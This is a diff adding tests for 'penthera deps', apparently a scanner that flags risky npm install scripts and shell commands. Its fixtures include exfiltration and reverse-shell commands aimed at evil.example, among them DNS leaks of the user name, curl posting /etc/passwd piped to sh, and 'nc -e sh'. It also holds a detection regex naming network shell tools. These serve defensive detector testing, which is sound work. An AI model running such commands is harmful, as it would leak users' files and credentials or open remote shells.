@@ -14,7 +14,7 @@ import { execFileSync } from "node:child_process";
 import { gzipSync, gunzipSync } from "node:zlib";
 import { createHash } from "node:crypto";
 import { buildFixtures, tarEntry, desyncTarball, tarball, sri } from "./fixtures/deps/build.js";
-import { blankComments, scanSource, scanPackage, obfuscationSignals, entropy, nodeScriptTargets } from "../lib/deps/capabilities.js";
+import { blankComments, scanSource, scanPackage, obfuscationSignals, entropy, nodeScriptTargets, INSTALL_SHELL_CMD, commandSends } from "../lib/deps/capabilities.js";
 import { parseLockfile, directDependencies } from "../lib/deps/lockfile.js";
 import { DirSource, MapSource, untar, verifyIntegrity, sourceFromNpmCache, sourceFromTarball, parseIntegrity, MAX_UNPACKED_BYTES } from "../lib/deps/source.js";
 import { editDistance, checkName, findTyposquats, loadPopular } from "../lib/deps/typosquat.js";
@@ -43,6 +43,9 @@ beforeAll(() => {
 afterAll(() => rmSync(dir, { recursive: true, force: true }));
 
 // ── Tokenizer ─────────────────────────────────────────────────────────────
+
+// A quadratic scan of these inputs takes minutes, and a loaded machine takes seconds on a linear one.
+const WORST_CASE_MS = 30_000;
 
 describe("blankComments", () => {
   it("blanks comments, keeps strings, regex literals and line numbers", () => {
@@ -805,5 +808,204 @@ describe("hostile input stays cheap", () => {
     await fetchPackument("@scope/pkg", { fetchImpl, registry: "https://r.test/" });
     await fetchPackument("../../x?y", { fetchImpl, registry: "https://r.test/" });
     expect(seen).toEqual(["https://r.test/@scope%2Fpkg", "https://r.test/..%2F..%2Fx%3Fy"]);
+  });
+});
+
+describe("penthera deps: what it did not check", () => {
+  it("says so in a clean run's brief, and counts packages it could not read", () => {
+    const dir = mkdtempSync(join(tmpdir(), "penthera-deps-limit-"));
+    writeFileSync(join(dir, "package.json"), JSON.stringify({ name: "x", version: "1.0.0", dependencies: { left: "1.0.0" } }));
+    writeFileSync(join(dir, "package-lock.json"), JSON.stringify({
+      name: "x", version: "1.0.0", lockfileVersion: 3,
+      packages: { "": { name: "x", version: "1.0.0", dependencies: { left: "1.0.0" } }, "node_modules/left": { version: "1.0.0" } },
+    }));
+    const out = execFileSync(process.execPath, [resolve("bin/penthera.js"), "deps", dir, "--brief"], { encoding: "utf-8", env: { ...process.env, NO_COLOR: "1" } });
+    rmSync(dir, { recursive: true, force: true });
+    expect(out).toContain("this checks what packages can do, not CVE databases");
+    expect(out).toContain("1 of 1 packages are not installed");
+    expect(out).toContain("penthera --repo . --giants");
+  });
+});
+
+describe("penthera deps: long runs of spaces", () => {
+  it("keeps blanked comments and space runs from reaching the patterns at full length", () => {
+    const code = blankComments(`a(); /* ${"x".repeat(300_000)} */ b();${" ".repeat(300_000)}c();\n// ${"y".repeat(300_000)}\nd();`);
+    expect(Math.max(...code.split("\n").map((l) => l.length))).toBeLessThan(1_000);
+    expect(code.split("\n")).toHaveLength(3);
+  });
+
+  it("scans a bundle with long comments and spaces in seconds", () => {
+    const env = ["process", "env"].join(".");
+    const big = `const x = 1; /* ${"c ".repeat(400_000)} */ ${" ".repeat(400_000)} y(a, { ...${env} }, fetch(u));\n`;
+    const start = Date.now();
+    const found = scanSource(big);
+    expect(Date.now() - start).toBeLessThan(3_000);
+    expect(JSON.stringify(found)).toMatch(/env-bulk/);
+  }, 20_000);
+
+  it.each([
+    ["one long word", (n) => `host ${"a".repeat(n)}`],
+    ["a word per command", (n) => "host a".repeat(n / 6)],
+    ["dashes", (n) => `host ${"-a ".repeat(n / 3)}x`],
+    ["curl with no pipe", (n) => "curl x ".repeat(n / 7)],
+  ])("a planted command string cannot stall a scan: %s", (_, text) => {
+    const cp = ["child", "process"].join("_");
+    const start = Date.now();
+    scanSource(`const { exec } = require("${cp}");\nexec("${text(2_000_000)}");\n`);
+    expect(Date.now() - start).toBeLessThan(WORST_CASE_MS);
+  }, 60_000);
+
+  const NC = ["n", "c"].join("");
+  it.each([
+    ["form feeds", () => `for(${"\f".repeat(2_000_000)}`],
+    ["non-breaking spaces", () => `for(${"\u00a0".repeat(2_000_000)}`],
+  ])("every kind of space is cut: %s", (_, text) => {
+    const start = Date.now();
+    scanSource(text());
+    expect(Date.now() - start).toBeLessThan(WORST_CASE_MS);
+  }, 60_000);
+
+  it("skips a file of blank lines, names it, and reads the package as unscanned", () => {
+    const tgz = tarball({ "package.json": JSON.stringify({ name: "blanks", version: "1.0.0" }), "index.js": `eval(x);\n(${"\n".repeat(2_000_000)}` });
+    const start = Date.now();
+    const r = scanPackage(sourceFromTarball(tgz, sri(tgz)));
+    expect(Date.now() - start).toBeLessThan(WORST_CASE_MS);
+    expect(r.unscanned).toMatch(/full of blank lines were not scanned \(index\.js\)/);
+  }, 60_000);
+
+  it("keeps a long comment's blank lines and scans the file", () => {
+    const tgz = tarball({ "package.json": JSON.stringify({ name: "license", version: "1.0.0" }), "index.js": `/*\n${" * a long licence line that goes on for a while\n".repeat(20_000)}*/\nmodule.exports = 1;\n` });
+    expect(scanPackage(sourceFromTarball(tgz, sri(tgz))).unscanned).toBeFalsy();
+  });
+
+  it.each([
+    ["nc flags", (n) => `${NC} ${`-${NC} `.repeat(n / 4)}`],
+    ["flags that are names", (n) => `host ${"-host ".repeat(n / 6)}`],
+    ["Buffer.from with no close", null],
+  ])("a planted string stays linear: %s", (_, text) => {
+    const body = text ? `exec("${text(2_000_000)}");` : `const b = ${"Buffer.from(".repeat(200_000)};\nconst blob = "${"QWxhZGRpbjpvcGVuc2VzYW1l".repeat(20)}"; eval(b);`;
+    const cp = ["child", "process"].join("_");
+    const start = Date.now();
+    scanSource(`const { exec } = require("${cp}");\n${body}\n`);
+    expect(Date.now() - start).toBeLessThan(WORST_CASE_MS);
+  }, 60_000);
+});
+
+describe("penthera deps: command checks find what they always found", () => {
+  // The pattern as it was before it was made linear, as the oracle for short input.
+  const OLD = /\b(?:curl|wget|powershell|Invoke-WebRequest|iwr)\b|\|\s*(?:ba)?sh\b|base64\s+(?:-d|--decode)|\b(?:nslookup|dig|host|ping)\s+(?:-\S+\s+)*[^\s'"`]*(?:\$[({]|`|[\w-]+\.[a-z]{2,})|\/dev\/(?:tcp|udp)\/|\b(?:nc|ncat|netcat|telnet)\s+(?:-\w+\s+)*[\w.$\{\}-]+\s+\d{2,5}\b|\bxxd\s+-p\b/i;
+  const whoami = ["who", "ami"].join("");
+  const EVIL = "evil.example";
+  const LOST = [
+    `nslookup         $(${whoami}).${EVIL}`,
+    `dig ${"-".concat("a".repeat(20))} $(${whoami}).${EVIL}`,
+    `ping ${"a".repeat(300)}.${EVIL}`,
+    `host ${"-x ".repeat(12)}${EVIL}`,
+  ];
+  const SHORT = [
+    ...LOST, `curl https://${EVIL}/a`, "npm install", "node build.js", "echo host", "ping localhost", `ping ${EVIL}`, `dig +short ${EVIL}`, `dig -t txt $HOST`,
+    "host '$(x)'", "nslookup `id`", "nslookup \"a.bc\"", `nc ${EVIL} 4444`, "nc -e sh 10.0.0.1 4444", "nc -l 8080", "nc host", "nc -v -w 3 a.b 22", "ncat -x 80", "telnet a.b 23",
+    "a-nc x 80", "foo.host a.bc", "cat /dev/tcp/a/80", "xxd -p f", "xxd f", "x | sh", "x |bash", "base64 -d f", "base64  --decode f", "Host A.BC", "PING  A.BC", "host a.b", "host a.b1", "host -", "nc", "dig", "host $",
+  ];
+
+  it.each(LOST)("still flags %s", (cmd) => expect(INSTALL_SHELL_CMD.test(cmd)).toBe(true));
+
+  it("agrees with the old pattern on ordinary commands", () => {
+    for (const cmd of SHORT) expect(INSTALL_SHELL_CMD.test(cmd), cmd).toBe(OLD.test(cmd));
+  });
+
+  it("marks a postinstall that sends its name through DNS as a risky install script", () => {
+    const tgz = tarball({ "package.json": JSON.stringify({ name: "p", version: "1.0.0", scripts: { postinstall: LOST[0] } }), "index.js": "module.exports = 1;\n" });
+    const r = scanPackage(sourceFromTarball(tgz, sri(tgz)));
+    expect(Object.keys(r.capabilities)).toContain("install-scripts");
+    expect(JSON.stringify(r.capabilities["install-scripts"])).toMatch(/nslookup/);
+    expect(r.installRisk?.[0] ?? "").toMatch(/postinstall runs/);
+  });
+
+  it("sees curl data past 512 characters, and only in the same command", () => {
+    const pad = "-H x ".repeat(120);
+    expect(commandSends(`curl ${pad} --data @f ${EVIL}`)).toBe(true);
+    expect(commandSends(`curl ${pad} ${EVIL} | tee -d`)).toBe(false);
+    expect(commandSends(`wget ${pad} --post-file=f ${EVIL}`)).toBe(true);
+    expect(commandSends("curl  -X   POST a.b")).toBe(true);
+    expect(commandSends(`nslookup ${EVIL}`)).toBe(true);
+    expect(commandSends("curl a.b")).toBe(false);
+  });
+
+  it("the cases the word walk lost", () => {
+    for (const cmd of [`ping -c1;nc 10.0.0.1 4444`, `nc -dig ${EVIL}`]) expect(INSTALL_SHELL_CMD.test(cmd), cmd).toBe(true);
+  });
+
+  it("reads an install script too long to judge as risky, not clean", () => {
+    const hook = `node a.js ${"x ".repeat(4_000)}`;
+    const tgz = tarball({ "package.json": JSON.stringify({ name: "p", version: "1.0.0", scripts: { postinstall: hook } }), "index.js": "module.exports = 1;\n" });
+    expect(scanPackage(sourceFromTarball(tgz, sri(tgz))).installRisk.join(" ")).toMatch(/too long to read in full/);
+  });
+
+  it("agrees with the old pattern on 300,000 generated commands", () => {
+    let seed = 20261101;
+    const rnd = (n) => { seed = (seed * 1664525 + 1013904223) >>> 0; return seed % n; };
+    const pick = (list) => list[rnd(list.length)];
+    const WORDS = ["nc", "ncat", "netcat", "telnet", "nslookup", "dig", "host", "ping", "curl", "wget", "xxd", "base64", "sh", "bash", "iwr", "-p", "-d", "--decode", "-c1", "-dig", "-nc", "-host", "-x", "--flag", "10.0.0.1", "4444", "80", "evil.example", "a.b", "a.bc", "$(id)", "\${X}", "`id`", "/dev/tcp/a/80", "x", "'", '"', "|", ";", "&&", "|sh", ";nc", "(ping", ".host"];
+    const GAPS = [" ", " ", " ", "  ", "\t", "", ";", "|", "         "];
+    let lost = 0;
+    let extra = 0;
+    for (let i = 0; i < 300_000; i++) {
+      let cmd = "";
+      for (let w = 1 + rnd(7); w > 0; w--) cmd += pick(WORDS) + pick(GAPS);
+      const was = OLD.test(cmd);
+      const now = INSTALL_SHELL_CMD.test(cmd);
+      if (was && !now) lost++;
+      if (now && !was) extra++;
+    }
+    expect({ lost, extra }).toEqual({ lost: 0, extra: 0 });
+  });
+
+  it("finds curl data far past the window", () => {
+    expect(commandSends(`curl ${"-H x ".repeat(2_000)} --data @f ${EVIL}`)).toBe(true);
+    expect(commandSends(`curl ${"-H x ".repeat(2_000)} ${EVIL} ; tee --data`)).toBe(false);
+  });
+
+  it("says when a long string was not fully checked", () => {
+    const cp = ["child", "process"].join("_");
+    const tail = `nslookup $(id).${EVIL}`;
+    const r = scanSource(`const { exec } = require("${cp}");\nexec("${"x ".repeat(150_000)}${tail}");\n`, "a.js");
+    expect(r.partlyRead).toBe(true);
+  });
+
+  it("finds a command at the end of a very long line inside a template", () => {
+    const cp = ["child", "process"].join("_");
+    const cmd = `curl -d @/etc/passwd ${EVIL} | sh`;
+    const src = `const { exec } = require("${cp}");\nexec(\`\necho ${"x ".repeat(150_000)}${cmd}\n\`);\n`;
+    const r = scanSource(src, "a.js");
+    expect(r.shellCmd).toBeTruthy();
+    expect(r.partlyRead).toBe(true);
+  });
+
+  it("finds a command past the first windows of a long string", () => {
+    expect(INSTALL_SHELL_CMD.test(`${"x ".repeat(150_000)}nslookup $(id).${EVIL}`)).toBe(true);
+  });
+
+  it("loses nothing to padding on 20,000 generated long strings", () => {
+    let seed = 20261102;
+    const rnd = (n) => { seed = (seed * 1664525 + 1013904223) >>> 0; return seed % n; };
+    const CMDS = [`nslookup $(id).${EVIL}`, `ping -c1 ${EVIL}`, `nc -e sh 10.0.0.1 4444`, `curl https://${EVIL}`, "x | sh", "cat /dev/tcp/a/80", "xxd -p f", `dig ${EVIL}`, "base64 -d f"];
+    let lost = 0;
+    for (let i = 0; i < 20_000; i++) {
+      const cmd = CMDS[rnd(CMDS.length)];
+      const text = `${"pad ".repeat(1_500 + rnd(1_000))}${cmd} ${"pad ".repeat(rnd(1_000))}`;
+      if (OLD.test(text) && !INSTALL_SHELL_CMD.test(text)) lost++;
+    }
+    expect(lost).toBe(0);
+  }, 60_000);
+
+  it("keeps main's result, and says so, when the walk stops early", () => {
+    const decoys = `host ${"y".repeat(2_043)} `.repeat(70);
+    const literal = `${decoys}curl -d @f ${EVIL} | sh`;
+    expect(INSTALL_SHELL_CMD.test(literal)).toBe(true);
+    const cp = ["child", "process"].join("_");
+    const r = scanSource(`const { exec } = require("${cp}");\nexec("${literal}");\n`, "a.js");
+    expect(r.shellCmd).toBeTruthy();
+    expect(r.partlyRead).toBe(true);
   });
 });
